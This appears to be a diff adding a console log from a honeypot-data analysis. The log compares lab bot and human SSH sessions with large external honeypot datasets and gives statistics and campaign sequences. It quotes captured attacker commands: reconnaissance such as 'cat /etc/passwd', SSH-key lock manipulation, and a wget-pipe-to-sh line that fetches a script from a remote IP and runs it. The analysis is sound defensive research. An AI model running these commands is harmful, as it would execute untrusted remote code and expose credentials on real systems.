@@ -1,0 +1,108 @@
+nohup: ignoring input
+
+=== LAB ===
+{
+ "malformed_lines": 0,
+ "by_class": {
+  "bot": {
+   "sessions": 21,
+   "with_commands": 21,
+   "log_closed": 21,
+   "duplicate_true": 20,
+   "unique_shasums": 1,
+   "tty_file_exists": 21,
+   "sessions_with_derived": 0,
+   "derived_events": 0,
+   "empty_inputs": 0
+  },
+  "human": {
+   "sessions": 31,
+   "with_commands": 31,
+   "log_closed": 31,
+   "duplicate_true": 0,
+   "unique_shasums": 31,
+   "tty_file_exists": 31,
+   "sessions_with_derived": 0,
+   "derived_events": 0,
+   "empty_inputs": 4
+  },
+  "other": {
+   "sessions": 120,
+   "with_commands": 120,
+   "log_closed": 111,
+   "duplicate_true": 74,
+   "unique_shasums": 38,
+   "tty_file_exists": 111,
+   "sessions_with_derived": 0,
+   "derived_events": 0,
+   "empty_inputs": 9
+  }
+ }
+}
+bot sessions in time order [session, user, duplicate, shasum]:
+   0a4e00f7e3f7 bot1 dup=0 4eef4e7e5bbb
+   153207a3cfff bot1 dup=1 4eef4e7e5bbb
+   18608d39c869 bot1 dup=1 4eef4e7e5bbb
+   c6cfb6839ad2 bot1 dup=1 4eef4e7e5bbb
+   c73b2b3dbe0b bot1 dup=1 4eef4e7e5bbb
+   340474ea14cc bot1 dup=1 4eef4e7e5bbb
+   d17637ffccd0 bot2 dup=1 4eef4e7e5bbb
+   f01259738890 bot2 dup=1 4eef4e7e5bbb
+   a9e49614dade bot2 dup=1 4eef4e7e5bbb
+   db65070af843 bot2 dup=1 4eef4e7e5bbb
+   f06079988058 bot2 dup=1 4eef4e7e5bbb
+   4a4b1f923159 bot3 dup=1 4eef4e7e5bbb
+   0a3cad945eaa bot3 dup=1 4eef4e7e5bbb
+   9b5e2228252b bot3 dup=1 4eef4e7e5bbb
+   769f80a2971a bot3 dup=1 4eef4e7e5bbb
+   d88772110ce2 bot3 dup=1 4eef4e7e5bbb
+   cf3523ed30a0 bot4 dup=1 4eef4e7e5bbb
+   12d54031c0a6 bot4 dup=1 4eef4e7e5bbb
+   f0c14590bd68 bot4 dup=1 4eef4e7e5bbb
+   ad32c5b4ee08 bot4 dup=1 4eef4e7e5bbb
+   042806a46d27 bot4 dup=1 4eef4e7e5bbb
+one bot session's commands: ['id', 'whoami', 'uname -a', 'hostname', 'cat /etc/passwd', 'ps aux', 'netstat -an', 'ls -la /root', 'exit']
+[+] scanned data/external/cow160/logs_by_day/2025-06-28.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-07-09.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-07-22.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-08-03.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-08-16.json.gz
+
+=== EXTERNAL ===
+sessions: 216063
+sessions_without_events: 0
+sessions_with_derived: 34166
+derived_events: 90250
+empty_inputs: 1047
+events_hist_old: {'0': 0, '1': 152509, '2': 29630, '3': 214, '4-8': 12812, '9': 5393, '>=10': 15505}
+lines_hist_v2: {'0': 230, '1': 171216, '2': 27694, '3': 134, '4-8': 438, '9': 862, '>=10': 15489}
+campaign_v2: {'all_ge1': 164046, 'ge2': 28512, 'ge3': 977, 'sequences_ge2': 7}
+login_ts_available: 1.0
+first_cmd_latency_median_campaign: 0.5884
+pseudonyms: 8208
+pseudonyms_on_ge2_days: 3239
+asn_key_used: src_ip_geoip_asn_number
+pseudonyms_with_asn: 8206
+pseudonyms_with_gt1_asn: 84
+old primary sequences -> lines after collapse:
+  0f07606f9b9db971  n=    91  {'0': 0, '1': 0, '2': 0, '3': 91, '4-8': 0, '9': 0, '>=10': 0}
+  2deb137237dfe6b3  n=    13  {'0': 0, '1': 0, '2': 0, '3': 0, '4-8': 0, '9': 0, '>=10': 13}
+  40c408712ec9b56a  n=   794  {'0': 0, '1': 794, '2': 0, '3': 0, '4-8': 0, '9': 0, '>=10': 0}
+  52c22fda6ba7d518  n= 27535  {'0': 0, '1': 0, '2': 27535, '3': 0, '4-8': 0, '9': 0, '>=10': 0}
+  71dcc2bf892150b3  n=  2928  {'0': 0, '1': 2928, '2': 0, '3': 0, '4-8': 0, '9': 0, '>=10': 0}
+  92735ea50fa4840c  n=     6  {'0': 0, '1': 0, '2': 0, '3': 0, '4-8': 6, '9': 0, '>=10': 0}
+  949e8dc5e22928ea  n=    31  {'0': 0, '1': 0, '2': 0, '3': 0, '4-8': 31, '9': 0, '>=10': 0}
+  b76caa5ccf1dbaec  n=   805  {'0': 0, '1': 805, '2': 0, '3': 0, '4-8': 0, '9': 0, '>=10': 0}
+  e652880c30fb97fc  n=   830  {'0': 0, '1': 0, '2': 0, '3': 0, '4-8': 0, '9': 830, '>=10': 0}
+  f2beae8e133aff5c  n=     6  {'0': 0, '1': 0, '2': 0, '3': 0, '4-8': 0, '9': 0, '>=10': 6}
+campaign sequences with >= 2 lines after collapse:
+  52c22fda6ba7d518  n= 27535  ips= 4375  lines=  2  cd ~; chattr -ia .ssh; lockr -ia .ssh
+  e652880c30fb97fc  n=   830  ips=  242  lines=  9  /ip cloud print
+  0f07606f9b9db971  n=    91  ips=   87  lines=  3  cd ~; chattr -ia .ssh; lockr -ia .ssh
+  949e8dc5e22928ea  n=    31  ips=    9  lines=  8  /ip cloud print
+  2deb137237dfe6b3  n=    13  ips=   12  lines= 11  uname -a
+  354786ac9c97585a  n=     6  ips=    6  lines= 17  cd ~; chattr -ia .ssh; lockr -ia .ssh
+  92735ea50fa4840c  n=     6  ips=    6  lines=  6  wget -qO - http://61.215.151.173/x/1sh | sh > /dev/null 2>&1 &
+login event keys: ['arch', 'compCS', 'data', 'destfile', 'dst_ip', 'dst_port', 'duration', 'encCS', 'eventid', 'filename', 'fingerprint', 'group', 'hassh', 'hasshAlgorithms', 'height', 'honeypot_ip', 'honeypot_ip_geoip_asn_number', 'honeypot_ip_geoip_asn_org', 'honeypot_ip_geoip_city_name', 'honeypot_ip_geoip_country_iso_code', 'honeypot_ip_geoip_country_name', 'honeypot_ip_geoip_location', 'honeypot_ip_geoip_region_name', 'id', 'input', 'kexAlgs', 'key', 'keyAlgs', 'langCS', 'macCS', 'message', 'name', 'outfile', 'password', 'protocol', 'realm', 'sensor', 'session', 'shasum', 'size', 'src_ip', 'src_ip_geoip_asn_number', 'src_ip_geoip_asn_org', 'src_ip_geoip_city_name', 'src_ip_geoip_country_iso_code', 'src_ip_geoip_country_name', 'src_ip_geoip_location', 'src_ip_geoip_region_name', 'src_port', 'ts', 'ts_indexed', 'type', 'url', 'username', 'value', 'version', 'width']
+
+[+] reports/diagnostics/diagnostics.json  and  reports/diagnostics/external_lines_v2.csv
